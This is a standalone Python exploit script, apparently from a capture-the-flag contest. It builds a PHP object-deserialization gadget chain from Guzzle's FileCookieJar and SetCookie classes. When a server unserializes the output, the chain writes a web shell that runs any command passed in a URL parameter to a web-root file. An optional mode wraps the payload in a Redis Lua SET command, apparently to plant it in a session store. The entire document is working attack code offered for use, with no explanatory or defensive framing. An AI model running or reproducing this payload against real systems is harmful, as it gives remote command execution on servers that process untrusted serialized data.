#!/usr/bin/env python3
import sys
from collections import OrderedDict


def ser(v):
    if v is None:
        return b"N;"
    if v is True:
        return b"b:1;"
    if v is False:
        return b"b:0;"
    if isinstance(v, int):
        return b"i:%d;" % v
    if isinstance(v, str):
        return ser_bytes(v.encode())
    if isinstance(v, bytes):
        return ser_bytes(v)
    if isinstance(v, (list, tuple)):
        out = [b"a:%d:{" % len(v)]
        for i, item in enumerate(v):
            out.append(ser(i))
            out.append(ser(item))
        out.append(b"}")
        return b"".join(out)
    if isinstance(v, dict):
        out = [b"a:%d:{" % len(v)]
        for k, item in v.items():
            out.append(ser(k))
            out.append(ser(item))
        out.append(b"}")
        return b"".join(out)
    if isinstance(v, Obj):
        out = [b'O:%d:"' % len(v.cls.encode()), v.cls.encode(), b'":%d:{' % len(v.props)]
        for name, item in v.props:
            out.append(ser_bytes(name))
            out.append(ser(item))
        out.append(b"}")
        return b"".join(out)
    raise TypeError(type(v))


def ser_bytes(b):
    return b's:%d:"' % len(b) + b + b'";'


class Obj:
    def __init__(self, cls, props):
        self.cls = cls
        self.props = props


def build(filename, phpcode, name="pwn"):
    data = OrderedDict()
    data["Name"] = name
    data["Value"] = phpcode
    data["Domain"] = None
    data["Path"] = "/"
    data["Max-Age"] = None
    data["Expires"] = 9999999999
    data["Secure"] = False
    data["Discard"] = False
    data["HttpOnly"] = False

    cookie = Obj(
        "GuzzleHttp\\Cookie\\SetCookie",
        [
            (b"\x00GuzzleHttp\\Cookie\\SetCookie\x00data", data),
            (b"\x00GuzzleHttp\\Cookie\\SetCookie\x00hostOnly", False),
        ],
    )
    jar = Obj(
        "GuzzleHttp\\Cookie\\CookieJar",
        [
            (b"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies", [cookie]),
            (b"\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode", False),
        ],
    )
    fcj = Obj(
        "GuzzleHttp\\Cookie\\FileCookieJar",
        [
            (b"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename", filename),
            (b"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies", False),
            (b"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies", [cookie]),
            (b"\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode", False),
        ],
    )
    return b"pwn|" + ser(fcj)


def to_lua(payload):
    parts = payload.split(b"\x00")
    pieces = []
    for i, part in enumerate(parts):
        if i > 0:
            pieces.append("string.char(0)")
        if part:
            assert b"]]" not in part, "payload part contains ]]"
            pieces.append("[[" + part.decode("latin-1") + "]]")
        else:
            pieces.append("''")
    if not pieces:
        pieces = ["''"]
    script = "local p = " + " .. ".join(pieces) + " redis.call('SET', KEYS[1], p, 'EX', 1800) return #p"
    assert "\x00" not in script
    return script


if __name__ == "__main__":
    filename = sys.argv[1] if len(sys.argv) > 1 else "/var/www/html/qwbshell.php"
    phpcode = sys.argv[2] if len(sys.argv) > 2 else "<?php system($_GET[0]);?>"
    payload = build(filename, phpcode)
    mode = sys.argv[3] if len(sys.argv) > 3 else "bin"
    if mode == "lua":
        print(to_lua(payload))
    else:
        sys.stdout.buffer.write(payload)
